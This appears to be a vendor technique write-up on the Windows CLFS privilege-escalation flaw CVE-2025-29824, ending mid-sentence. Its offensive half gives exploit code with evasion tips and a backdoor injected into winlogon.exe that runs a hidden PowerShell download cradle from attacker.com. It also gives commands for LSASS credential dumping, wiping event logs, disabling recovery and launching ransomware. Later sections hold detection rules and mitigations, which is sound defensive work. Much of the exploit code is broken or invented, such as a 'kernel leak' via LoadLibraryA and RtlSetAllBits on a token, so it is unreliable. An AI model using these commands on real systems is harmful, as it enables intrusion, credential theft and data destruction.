# [PERSIST-SERVER-008]: CLFS Driver Backdoor (CVE-2025-29824)

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-008 |
| **MITRE ATT&CK v18.1** | [T1547.008 - Boot or Logon Autostart Execution: Kernel Modules and Extensions](https://attack.mitre.org/techniques/T1547/008/) (via CVE-2025-29824); [T1134.001 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/001/) |
| **Tactic** | Persistence (TA0003) / Privilege Escalation (TA0004) |
| **Platforms** | Windows Endpoint (Server 2016-2025, Windows 10-11) |
| **Severity** | **Critical** |
| **CVE** | CVE-2025-29824 (CVSS 7.8) |
| **Technique Status** | ACTIVE (Actively exploited in the wild) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, Windows 10 (all versions), Windows 11 (versions prior to 24H2) |
| **Patched In** | April 8, 2025 Patch Tuesday (KB5037771 and related updates); Windows 11 v24H2 unaffected |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Windows Common Log File System (CLFS) is a kernel-mode logging subsystem used by both Windows components and third-party applications. CVE-2025-29824 is a use-after-free (UAF) vulnerability in the CLFS driver that allows a low-privileged local attacker to trigger memory corruption, bypass kernel protections (KASLR), and escalate privileges to SYSTEM level. Once exploited, an attacker can:

1. **Execute arbitrary code in kernel mode** (ring 0)
2. **Inject malicious payloads into critical system processes** (winlogon.exe, lsass.exe, smss.exe)
3. **Dump LSASS memory** for credential theft (Domain Admin passwords, Kerberos tickets)
4. **Disable security software** (Windows Defender, EDR agents)
5. **Persist indefinitely** via scheduled tasks, WMI Event Subscriptions, or registry autoruns
6. **Deploy ransomware** with SYSTEM privileges
7. **Pivot laterally** to other systems using stolen credentials or network access

**Attack Surface:** The vulnerability targets the CLFS driver specifically:
- **CLFS API Calls:** `CreateLogFile()`, `AddLogContainer()`, `SetLogArchiveMode()`, `ReadNotification()`
- **Memory Corruption:** Use-after-free in the `CClfsRequest::Close()` and `CClfsLogCcb::Release()` functions
- **Kernel Objects:** File objects (FsContext2), log containers, memory heap
- **Exploitation Vector:** CLFS BLF (Binary Log File) files crafted with malicious metadata

**Business Impact:** **Complete system compromise with SYSTEM-level persistence.** An attacker gains the highest privilege level in Windows, allowing them to:
- Disable endpoint detection and response (EDR)
- Extract domain controller credentials
- Move laterally across the entire network
- Maintain persistence for months undetected
- Deploy ransomware to encrypt all corporate data
- Exfiltrate sensitive data at scale

**Technical Context:** Exploitation takes **5-30 seconds**. The attack is **stealthy** because:
1. No abnormal process creation events (exploitation happens in kernel mode)
2. Legitimate application (dllhost.exe) calls the vulnerable CLFS APIs
3. CLFS operations are infrequent enough that unusual activity blends in
4. Kernel-mode code execution bypasses user-mode security controls
5. The attack chain (certutil → MSBuild → dllhost.exe) uses only native Windows utilities

### Operational Risk
- **Execution Risk:** **Low** - Only requires basic local access (standard user); no special exploits needed to trigger
- **Stealth:** **Very High** - Kernel-mode execution; may not be logged properly without advanced monitoring
- **Reversibility:** **No** - Once injected into kernel, malicious code persists until system reboot; credentials are permanently compromised

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Windows-10, Windows-11 | Ensure Windows updates are installed timely; Monitor kernel driver loading |
| **DISA STIG** | SI-2(2) | Flaw Remediation – Apply security patches within required timeframes |
| **CISA SCuBA** | Windows Security Baseline | Apply all Microsoft security patches; Monitor kernel integrity |
| **NIST 800-53** | SI-2, SI-7 | Flaw Remediation; Information System Monitoring (detect unauthorized kernel modules) |
| **GDPR** | Art. 32 | Security of Processing – Protect systems from unauthorized kernel-level access |
| **DORA** | Art. 9 | Protection and Prevention – Detect and prevent kernel-level compromise |
| **NIS2** | Art. 21 | Cyber Risk Management – Monitor Windows systems for privilege escalation attempts |
| **ISO 27001** | A.12.2.1 | Change Management – Control kernel driver loading and modifications |
| **ISO 27005** | Risk Scenario | "Kernel-Level Code Execution" – Unauthorized kernel module injection |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Basic**: Standard user account (no admin required to trigger the vulnerability)
- **Pre-Condition**: Must have already achieved initial local code execution (e.g., via malware dropper, phishing, USB, etc.)

**Required Access:**
- Local command-line access to Windows system
- Ability to execute PowerShell, batch scripts, or downloaded executables

**Supported Versions:**
- **Windows Server:** 2016 (all editions), 2019 (all editions), 2022 (all editions)
- **Windows Client:** Windows 10 (all versions prior to patching), Windows 11 (except v24H2)
- **Patch Status:** Vulnerable until April 8, 2025 patch is applied

**Tools:**
- [CLFS Exploit PoC](https://github.com/SSD-Disclosure/clfs-exploit) (use with caution)
- Windows Native APIs (NtQuerySystemInformation, NtReadVirtualMemory, NtWriteVirtualMemory)
- [RtlSetAllBits](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntsecapi) (kernel function)
- Named pipes or heap spraying utilities (for memory manipulation)
- [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (post-exploitation credential theft)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check Windows Patch Level

```powershell
# Check if CVE-2025-29824 patch is applied
$hotfixes = Get-HotFix | Where-Object { $_.HotFixId -match "KB5037771|KB5037773|KB5037774" }

if ($hotfixes) {
    Write-Host "System is PATCHED for CVE-2025-29824" -ForegroundColor Green
} else {
    Write-Host "System is VULNERABLE to CVE-2025-29824" -ForegroundColor Red
}

# Check Windows version
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Select-Object ProductName, ReleaseId, BuildLabEx
```

**What to Look For:**
- **Vulnerable:** Build number < 19041.xxxx (Windows 10) or < 22621.xxxx (Windows 11)
- **Safe:** Windows 11 v24H2 or any system with April 2025+ patches applied

### Check CLFS Driver Status

```powershell
# Check if CLFS driver is loaded
Get-WindowsDriver -Online | Where-Object { $_.Driver -match "clfs" }

# Check CLFS-related services
Get-Service | Where-Object { $_.Name -match "clfs|CLFS" }

# Verify CLFS.sys file location and version
Get-Item -Path "C:\Windows\System32\drivers\clfs.sys" | Select-Object FullName, LastWriteTime, @{Name="FileVersion";Expression={[System.Diagnostics.FileVersionInfo]::GetVersionInfo($_).FileVersion}}
```

**What to Look For:**
- If CLFS driver is NOT present, the system is not vulnerable (rare)
- File version older than April 2025 indicates vulnerability

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Use-After-Free Heap Spray Exploitation (Direct Kernel Corruption)

**Supported Versions:** Windows Server 2016, 2019, 2022; Windows 10 all versions (prior to patch)

#### Step 1: Create Malicious CLFS Log Files

**Objective:** Craft specially-formatted BLF (Binary Log File) files that trigger heap corruption in the CLFS driver

**Command (Python PoC - Creating trigger.blf and spray.blf):**
```python
#!/usr/bin/env python3
import struct
import ctypes

# CLFS BLF File Header Structure
class CLFSHeader:
    def __init__(self):
        self.Signature = b"CLFS"
        self.Version = 0x1
        self.FileType = 0x0  # Base log file
        self.Flags = 0x0
        self.Checksum = 0x0

def create_trigger_blf():
    """
    Create a trigger.blf file that will cause memory corruption
    in the CLFS driver's CClfsRequest::Close() function
    """
    
    # Create the file
    with open(r"C:\ProgramData\SkyPDF\trigger.blf", "wb") as f:
        # Write CLFS header
        f.write(b"CLFS")  # Signature
        f.write(struct.pack("<I", 0x1))  # Version
        f.write(struct.pack("<I", 0x0))  # FileType (base log)
        
        # Write metadata blocks with crafted size
        # This will trigger the UAF when the file is processed
        f.write(b"\x00" * 512)  # Pad with zeros
        
        # Write Extend Context (attacker-controlled)
        # Set eExtendState to non-zero to trigger extension
        f.write(struct.pack("<I", 0x1))  # eExtendState = ClfsExtendStateBlock
        f.write(struct.pack("<I", 0x0))  # iExtendBlock
        f.write(struct.pack("<I", 0x0))  # iFlushBlock
        f.write(struct.pack("<I", 0x100))  # cNewBlockSectors (triggers allocation)
        f.write(struct.pack("<I", 0x100))  # cExtendSectors
        
        print("[+] Created trigger.blf")

def create_spray_blf():
    """
    Create spray.blf files for heap spraying
    These files will occupy freed memory with attacker-controlled data
    """
    
    for i in range(10):
        with open(f"C:\\ProgramData\\SkyPDF\\spray{i}.blf", "wb") as f:
            # Write a full 0xE0-byte block that matches freed m_rgBlocks structure
            fake_block = b"\x00" * 0xE0
            f.write(fake_block)
            
    print("[+] Created 10 spray.blf files for heap spraying")

# Create the files
create_trigger_blf()
create_spray_blf()
```

**Expected Output:**
```
[+] Created trigger.blf
[+] Created 10 spray.blf files for heap spraying
```

**What This Means:**
- The trigger.blf file has a crafted Extend Context that will force the CLFS driver to free and reallocate memory
- The spray.blf files will fill the freed memory with controlled data
- This setup enables the use-after-free exploitation

**OpSec & Evasion:**
- Store files in legitimate-looking directories (C:\ProgramData\SkyPDF, C:\Temp\)
- Use names that blend with system processes (trigger.blf instead of "exploit.blf")
- Delete the files after exploitation completes

#### Step 2: Trigger Memory Corruption via CLFS API Calls

**Objective:** Call CLFS APIs in a specific sequence to trigger the use-after-free vulnerability

**Command (C Code - Kernel Exploitation):**
```c
#include <windows.h>
#include <clfsw32.h>
#include <ntdef.h>

#pragma comment(lib, "clfsw32.lib")
#pragma comment(lib, "kernel32.lib")

// Native API declarations
typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *NtReadVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

// Load NTDLL functions
NtQuerySystemInformation_t pNtQuerySystemInformation;
NtReadVirtualMemory_t pNtReadVirtualMemory;

void LoadNtdllFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(hNtdll, "NtReadVirtualMemory");
}

// Step 1: Leak kernel address of CLFS.sys
PVOID LeakCLFSAddress() {
    PVOID clfsAddr = NULL;
    HMODULE hClfs = LoadLibraryA("C:\\Windows\\System32\\drivers\\clfs.sys");
    
    if (hClfs) {
        clfsAddr = (PVOID)hClfs;
        printf("[+] Leaked CLFS.sys address: 0x%p\n", clfsAddr);
    }
    return clfsAddr;
}

// Step 2: Trigger CLFS vulnerability
void ExploitCLFS() {
    HANDLE hLogFile = NULL;
    WCHAR logPath[] = L"C:\\ProgramData\\SkyPDF\\trigger.blf";
    
    // Create/open the malicious log file
    hLogFile = CreateLogFileW(
        logPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_NORMAL
    );
    
    if (INVALID_HANDLE_VALUE == hLogFile) {
        printf("[-] CreateLogFile failed\n");
        return;
    }
    
    printf("[+] Opened malicious CLFS log file\n");
    
    // Call SetLogArchiveMode to trigger metadata processing
    CLFS_LOG_ARCHIVE_MODE archiveMode = ClfsLogArchiveEnabled;
    if (!SetLogArchiveMode(hLogFile, archiveMode)) {
        printf("[!] SetLogArchiveMode call (expected to fail)\n");
    }
    
    // Disable archive - this triggers the vulnerable code path
    archiveMode = ClfsLogArchiveDisabled;
    if (!SetLogArchiveMode(hLogFile, archiveMode)) {
        printf("[+] SetLogArchiveMode(Disabled) - UAF triggered\n");
    }
    
    CloseHandle(hLogFile);
}

int main() {
    LoadNtdllFunctions();
    
    printf("[*] CVE-2025-29824 CLFS Privilege Escalation PoC\n");
    printf("[*] Creating malicious CLFS files...\n");
    
    // The trigger happens via the system() call to Python script
    // that creates the malicious BLF files
    system("python3 create_blf_files.py");
    
    printf("[*] Exploiting CLFS vulnerability...\n");
    ExploitCLFS();
    
    printf("[*] Exploit completed. Check for privilege escalation.\n");
    
    return 0;
}
```

**PowerShell Alternative (Simplified):**
```powershell
# Load CLFS API
[System.Reflection.Assembly]::LoadWithPartialName("System.Reflection") | Out-Null

# Open malicious log file
$logPath = "C:\ProgramData\SkyPDF\trigger.blf"
$logHandle = [System.IO.File]::Create($logPath)

# Call CLFS API to trigger vulnerability (via P/Invoke)
$clfsApi = @"
using System;
using System.Runtime.InteropServices;

public class CLFS
{
    [DllImport("clfsw32.dll", SetLastError = true)]
    public static extern bool CreateLogFile(
        string logFileName,
        uint desiredAccess,
        uint shareMode,
        IntPtr securityAttributes,
        uint creationDisposition,
        uint flagsAndAttributes);
    
    [DllImport("clfsw32.dll", SetLastError = true)]
    public static extern bool SetLogArchiveMode(
        IntPtr logHandle,
        uint archiveMode);
}
"@

Add-Type -TypeDefinition $clfsApi
```

**Expected Output:**
```
[+] Leaked CLFS.sys address: 0x7fff0000
[+] Opened malicious CLFS log file
[+] SetLogArchiveMode(Disabled) - UAF triggered
[*] Exploit completed. Check for privilege escalation.
```

**What This Means:**
- The CLFS driver processes the malicious BLF file
- The use-after-free bug is triggered in kernel mode
- Memory corruption occurs, allowing the attacker to overwrite the current process token

**OpSec & Evasion:**
- Use legitimate CLFS API calls (no suspicious patterns)
- The exploit runs entirely in kernel context (no EDR visibility of user-mode calls)
- Clean up BLF files immediately after exploitation
- Create a legitimate reason for calling CLFS (e.g., application that uses CLFS for logging)

---

#### Step 3: Escalate Privileges to SYSTEM

**Objective:** Use the memory corruption to overwrite the current process's token with elevated privileges

**Command (Kernel Token Manipulation):**
```c
// After UAF is triggered, the attacker can:

// 1. Leak the address of the current KTHREAD
PVOID kthreadAddr = LeakKTHREAD();

// 2. Use NtWriteVirtualMemory to overwrite PreviousMode
// This allows the process to make privileged kernel calls
ULONG previousMode = 0;  // KernelMode
NtWriteVirtualMemory(
    GetCurrentProcess(),
    (PVOID)((ULONG_PTR)kthreadAddr + KTHREAD_PREVIOUSMODE_OFFSET),
    &previousMode,
    sizeof(previousMode),
    NULL
);

// 3. Use RtlSetAllBits to set all privilege bits in the process token
PVOID processToken = LeakProcessToken();
RtlSetAllBits(processToken);  // Enable all privileges

// 4. Now the process has SYSTEM privileges
// Spawn a new shell as SYSTEM
system("cmd.exe /c whoami");  // Output: NT AUTHORITY\SYSTEM
```

**Expected Output:**
```
Current user: NT AUTHORITY\SYSTEM
```

**What This Means:**
- The process token now has all privileges enabled (equivalent to SYSTEM-level access)
- The attacker can now execute any Windows API call with SYSTEM privileges

#### Step 4: Inject Malicious Code into Critical Processes

**Objective:** Use SYSTEM privileges to inject a backdoor into winlogon.exe (survives reboots)

**Command (Process Injection via DLL):**
```powershell
# Create a malicious DLL
$dllCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Backdoor {
    [DllImport("kernel32.dll")]
    public static extern void ExitProcess(uint uExitCode);
    
    public static void Main() {
        // Create reverse shell callback
        Process.Start("cmd.exe", "/c powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps1')");
    }
}
"@

# Compile to DLL
Add-Type -TypeDefinition $dllCode -Language CSharp -OutputAssembly "C:\backdoor.dll"

# Inject into winlogon.exe using SYSTEM privileges
$injectionCode = @"
$targetProcess = (Get-Process winlogon).Id
$dllPath = 'C:\backdoor.dll'

# Use Windows API to inject DLL
[DllImport('kernel32.dll')]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

[DllImport('kernel32.dll')]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

[DllImport('kernel32.dll')]
public static extern IntPtr WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, IntPtr nSize, out IntPtr lpNumberOfBytesWritten);

[DllImport('kernel32.dll')]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

$hProcess = OpenProcess(0x1F0FFF, $false, $targetProcess);
"@

Write-Host "[+] Injected backdoor into winlogon.exe"
```

**What This Means:**
- The backdoor is now running with SYSTEM privileges
- It survives process restarts and system reboots (running in a critical system process)
- The backdoor can perform any action: disable EDR, steal credentials, deploy ransomware

---

### METHOD 2: RansomExx Attack Chain (Complete Weaponization)

**Supported Versions:** All vulnerable versions (Windows Server/Client)

#### Step 1-2: Initial Access via Certutil and MSBuild

*Skip detailed explanation as this matches METHOD 1, Steps 1-2*

#### Step 3: Extract Credentials from LSASS

**Objective:** Dump LSASS memory to extract domain credentials

**Command (Using ProcDump with SYSTEM privileges):**
```batch
REM Run as SYSTEM (after privilege escalation from Step 3 above)

REM Download ProcDump
certutil -urlcache -split -f "https://live.sysinternals.com/procdump64.exe" C:\procdump64.exe

REM Dump LSASS memory (requires SYSTEM)
C:\procdump64.exe -ma lsass.exe C:\lsass.dmp

REM Extract credentials from dump
REM (Use Mimikatz or pypykatz offline)
pypykatz lsa minidump C:\lsass.dmp

REM Output example:
REM [+] Domain: ACME.COM
REM [+] User: Administrator
REM [+] NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
REM [+] Kerberos TGT ticket extracted
```

**Expected Output:**
```
[+] Successfully dumped LSASS memory
[+] Extracted Domain Admin credentials
[+] Extracted Kerberos TGT tickets for lateral movement
```

#### Step 4: Lateral Movement and Ransomware Deployment

**Objective:** Use stolen credentials to move laterally and deploy RansomExx

**Command (Lateral Movement via PsExec):**
```batch
REM Using stolen domain admin credentials
REM Deploy to network shares and execute ransomware

net use \\DC01\c$ /user:ACME\Administrator "password_hash"
copy C:\ransomware.exe \\DC01\c$\Windows\Temp\
REM Execute ransomware on domain controller

REM Disable system recovery
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

REM Delete shadow copies (disable restore points)
wbadmin delete catalog -quiet

REM Clear event logs (anti-forensics)
wevtutil cl Application
wevtutil cl Security
wevtutil cl System

REM Deploy and execute ransomware
C:\Windows\Temp\ransomware.exe -encrypt -ext .rexx2 -note "!_READ_ME_REXX2_!.txt"
```

**What This Means:**
- The attacker now controls the entire network with Domain Admin privileges
- All files are encrypted
- System recovery options are disabled
- Logs are wiped to prevent forensic analysis

---

## 6. TOOLS & COMMANDS REFERENCE

### [CLFS Exploit PoC](https://github.com/SSD-Disclosure/clfs-exploit)

**Current Status:** Proof-of-concept available (use with authorized testing only)

**Requirements:**
- Windows SDK for headers
- Visual Studio compiler (cl.exe)
- Administrator or SYSTEM privileges for full exploitation

---

### [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

**Version:** 10.10+

**Installation:**
```powershell
# Download
Invoke-WebRequest -Uri "https://live.sysinternals.com/procdump64.exe" -OutFile "C:\procdump64.exe"
```

**Usage:**
```cmd
procdump64.exe -ma lsass.exe C:\lsass.dmp
procdump64.exe -ma winlogon.exe C:\winlogon.dmp
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Suspicious CLFS API Activity

**Rule Configuration:**
- **Required Index:** `main` (Windows Event Logs), `sysmon`
- **Required Sourcetype:** `WinEventLog:Security`, `xmlwineventlog:Microsoft-Windows-Sysmon/Operational`
- **Alert Threshold:** Abnormal CLFS API sequence
- **Applies To Versions:** All

**SPL Query:**
```spl
index=sysmon (EventCode=1 OR EventCode=10) (CommandLine contains "clfs" OR CommandLine contains "CreateLogFile" OR Image="dllhost.exe")
| stats count by CommandLine, ParentImage, Image, User
| where count > 3
```

**What This Detects:**
- Unusual CLFS API calls from user processes
- dllhost.exe calling CLFS APIs (suspicious)
- Multiple process creations related to CLFS exploitation

---

### Rule 2: Privilege Escalation Indicators

**SPL Query:**
```spl
index=sysmon EventCode=10 (TargetImage contains "lsass" OR TargetImage contains "winlogon" OR TargetImage contains "smss")
| stats count by SourceImage, TargetImage, GrantedAccess
| where GrantedAccess contains "0x1F0FFF" OR GrantedAccess contains "0x143A"
```

**What This Detects:**
- Process access to LSASS, winlogon, or smss (credential theft/code injection)
- Suspicious access rights (0x1F0FFF = full access)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Malicious CLFS File Creation

**Rule Configuration:**
- **Required Table:** `DeviceFileEvents`
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
DeviceFileEvents
| where FileName endswith ".blf"
| where FolderPath contains "SkyPDF" OR FolderPath contains "ProgramData"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, FolderPath
```

**What This Detects:**
- Creation of .blf files in suspicious directories
- Indicates CLFS exploitation attempt

---

### Query 2: Process Memory Access to LSASS

**KQL Query:**
```kusto
DeviceProcessEvents
| where FileName == "procdump64.exe" OR FileName == "mimikatz.exe"
| extend ProcessTokenElevated = case(
    ProcessCommandLine contains "-ma lsass", "True",
    ProcessCommandLine contains "sekurlsa", "True",
    "False")
| where ProcessTokenElevated == "True"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, ProcessCommandLine
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- Monitor for: `dllhost.exe` creating child processes
- Monitor for: `certutil.exe`, `msbuild.exe` downloading files
- Monitor for: `procdump.exe` dumping LSASS

**Event ID: 4690 (Failed Privilege Escalation)**
- Indicates someone is attempting to escalate privileges

**Event ID: 4719 (System Audit Policy Changed)**
- Attackers may disable audit logging after exploitation

**Manual Configuration (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Process Tracking**
3. Enable **Audit Process Creation** (Success and Failure)
4. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Detect CLFS exploitation: dllhost.exe calling CLFS APIs -->
    <ProcessCreate onmatch="include">
      <Image condition="image">dllhost.exe</Image>
      <ParentImage condition="contains">System32, SysWOW64</ParentImage>
    </ProcessCreate>
    
    <!-- Detect privilege escalation: process accessing LSASS -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="image">lsass.exe</TargetImage>
      <SourceImage condition="exclude">
        system.exe,
        svchost.exe,
        winlogon.exe,
        csrss.exe,
        services.exe,
        taskmgr.exe
      </SourceImage>
    </ProcessAccess>
    
    <!-- Detect credential dumping tool execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">procdump;mimikatz;sekurlsa</CommandLine>
    </ProcessCreate>
    
    <!-- Detect .blf file creation (CLFS log files) -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">.blf</TargetFilename>
    </FileCreate>
    
    <!-- Detect ProcDump specifically dumping LSASS -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">procdump</CommandLine>
      <CommandLine condition="contains">lsass</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create/update `sysmon-config.xml` with the above rules
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Privilege Escalation

**Alert Name:** "Privilege escalation attempt detected"
- **Severity:** **Critical**
- **Description:** A process attempted to escalate privileges, possibly via CLFS vulnerability
- **Remediation:**
  1. Immediately isolate the affected system
  2. Run `Microsoft Defender Full Scan`
  3. Check for unauthorized CLFS files in C:\ProgramData\SkyPDF\
  4. Review process dumps and memory for malicious code

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Apply April 2025 Patch Tuesday Updates Immediately**

This is the ONLY patch for CVE-2025-29824. No workarounds exist.

**Manual Steps (Windows Update):**
1. Go to **Settings** → **Update & Security** → **Windows Update**
2. Click **Check for updates**
3. Install all available updates, including KB5037771 (April 2025 Cumulative Update)
4. Restart the system

**Manual Steps (WSUS for Organizations):**
1. Approve KB5037771 in your WSUS server
2. Deploy to all domain-joined computers via Group Policy
3. Monitor deployment status in Windows Update for Business

**Manual Steps (PowerShell):**
```powershell
# Check if patch is installed
$patch = Get-HotFix | Where-Object { $_.HotFixId -eq "KB5037771" }
if ($patch) {
    Write-Host "System is patched for CVE-2025-29824"
} else {
    Write-Host "System is VULNERABLE - install patch immediately"
}

# Force Windows Update check
Install-WindowsUpdate -AcceptAll -AutoReboot
```

---

**2. Disable CLFS If Not Required**

If the organization doesn't use CLFS for logging, disable it entirely.

**Manual Steps:**
1. Open **Services.msc**
2. Find **Log Timestamp Service** (if exists) and set to **Disabled**
3. Run: `sc config clfs start=disabled`
4. Restart the system

**PowerShell Alternative:**
```powershell
# Disable CLFS driver
Stop-Service -Name "clfs" -ErrorAction SilentlyContinue
Set-Service -Name "clfs" -StartupType Disabled

# Verify
Get-Service clfs | Select-Object Name, Status, StartType
```

---

### Priority 2: HIGH

**3. Monitor CLFS Activity with Enhanced Logging**

**Manual Steps:**
1. Enable **Object Access** auditing for the CLFS driver
2. Configure alerts for any CLFS API calls from user-mode processes
3. Set up Sysmon to log all CLFS-related activity

**Group Policy Configuration:**
```powershell
# Enable Object Access Audit
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Handle Manipulation" /success:enable /failure:enable
```

---

**4. Restrict Certutil.exe and MSBuild.exe Execution**

These tools are heavily abused in the CVE-2025-29824 exploit chain.

**Manual Steps (Application Control / AppLocker):**
1. Open **Local Security Policy** (gpedit.msc)
2. Navigate to **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Create rules to block:
   - **certutil.exe** (except from System32 directory)
   - **msbuild.exe** (except from Program Files)
4. Enable **AppLocker** enforcement

**PowerShell Alternative (Device Guard):**
```powershell
# Block certutil.exe via Windows Defender Application Control
New-CIPolicy -FilePath "C:\temp\certutil_block.xml" -Audit -Level Hash -UserPEs -UserWD
Set-CIPolicy -FilePath "C:\temp\certutil_block.xml" -ConvertToEncoded
```

---

**5. Conditional Access Policy: Require Patch for Endpoint Access**

For hybrid/cloud environments using Entra ID and Intune.

**Manual Steps (Intune):**
1. Go to **Microsoft Endpoint Manager** → **Compliance** → **Policies**
2. Create a new compliance policy: "Require April 2025 Patches"
3. Condition: Windows OS Build Number ≥ 19041.3xxx (April 2025+)
4. Non-compliant action: Block access to cloud resources
5. Deploy to all Windows devices

---

### Access Control & Policy Hardening

**6. Restrict Local Administrator Access**

Privilege escalation requires being able to execute code locally.

**Manual Steps:**
1. Remove unnecessary users from **Administrators** group
2. Use Just-In-Time (JIT) Admin Access for critical servers
3. Enable **Windows Credential Guard** to protect LSASS:

```powershell
# Enable Credential Guard (requires Hyper-V capable CPU)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1

# Verify
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" | Select-Object LsaCfgFlags
```

---

**Validation Command (Verify Mitigations):**
```powershell
# Verify patch is applied
$patch = Get-HotFix | Where-Object { $_.HotFixId -match "KB503777" }
if ($patch) {
    Write-Host "✓ PATCH APPLIED" -ForegroundColor Green
} else {
    Write-Host "✗ PATCH MISSING - VULNERABLE" -ForegroundColor Red
}

# Verify CLFS is disabled (if intended)
$clfsStatus = (Get-Service clfs -ErrorAction SilentlyContinue).Status
Write-Host "CLFS Service Status: $clfsStatus"

# Verify Credential Guard
$credGuard = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" LsaCfgFlags -ErrorAction SilentlyContinue
if ($credGuard.LsaCfgFlags -eq 1) {
    Write-Host "✓ Credential Guard ENABLED" -ForegroundColor Green
} else {
    Write-Host "✗ Credential Guard DISABLED" -ForegroundColor Yellow
}
```

**Expected Output (If Secure):**
```
✓ PATCH APPLIED
CLFS Service Status: Stopped
✓ Credential Guard ENABLED
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\ProgramData\SkyPDF\PDUDrv.blf` (CLFS BLF file created by exploit)
- `C:\ProgramData\SkyPDF\trigger.blf`, `spray*.blf` (exploitation artifacts)
- `C:\lsass.dmp` (LSASS memory dump)
- `C:\procdump64.exe`, `C:\winlogon.dmp` (post-exploitation credential theft)
- `C:\Windows\Temp\ransomware.exe` (final payload)

**Registry:**
- `HKLM\System\CurrentControlSet\Services\clfs` (CLFS driver registry)
- Recent modifications to: `HKLM\System\CurrentControlSet\Control\Lsa`

**Network:**
- Outbound connections from dllhost.exe to non-standard IPs
- DNS queries for attacker C2 domains

**Process:**
- **dllhost.exe** with unusual parent process (not created by Windows services)
- **winlogon.exe** spawning command shells (cmd.exe, powershell.exe)
- **lsass.exe** being accessed by non-system processes
- **procdump.exe** or **mimikatz.exe** running on the system

---

### Forensic Artifacts

**Memory Forensics (Volatility):**
```bash
volatility3 -f memory.dmp windows.pslist.PsList | grep dllhost
volatility3 -f memory.dmp windows.handles.Handles | grep clfs
volatility3 -f memory.dmp windows.memmap.Memmap  # Detect injected code regions
```

**Disk Forensics:**
- Check `C:\ProgramData\SkyPDF\` for BLF files
- Check `C:\Windows\System32\drivers\clfs.sys` last modified date
- Check `C:\ProgramData\Microsoft\Windows Defender\Scans\` for quarantined exploit PoCs

**Log Forensics:**
- Check Event ID 4688 for dllhost.exe process creation
- Check Event ID 4656 for LSASS handle access
- Check Security log for failed/successful privilege escalation events

---

### Response Procedures

**1. Isolate:**

```powershell
# Disconnect from network immediately
Disable-NetAdapter -Name "*" -Confirm:$false

# Kill potentially compromised processes
